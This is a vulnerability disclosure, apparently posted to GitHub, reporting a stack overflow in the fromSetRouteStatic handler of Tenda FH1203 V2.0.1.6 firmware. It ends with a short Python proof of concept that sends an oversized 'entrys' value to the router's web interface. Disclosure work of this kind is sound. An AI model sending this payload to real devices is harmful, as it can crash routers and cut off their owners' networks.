## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

The Tenda FH1203 V2.0.1.6 firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `v5` variable receives the `entrys` parameter from a POST request and is used in statement `sprintf(v15, "%s;%s", v12, (const char *)v14);`, which caused the buffer overflow attack. 

![image-20240320013608990](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013608990.png)

![image-20240320013512469](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013512469.png)

![image-20240320013520019](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013520019.png)

The user-provided `entrys` can trigger this security vulnerability.

## POC

```python
import requests

IP = "192.168.84.101"
url = f"http://{IP}/goform/fromRouteStatic"
payload = b'a'*1000
data = {"entrys": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240320013432318](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320013432318.png)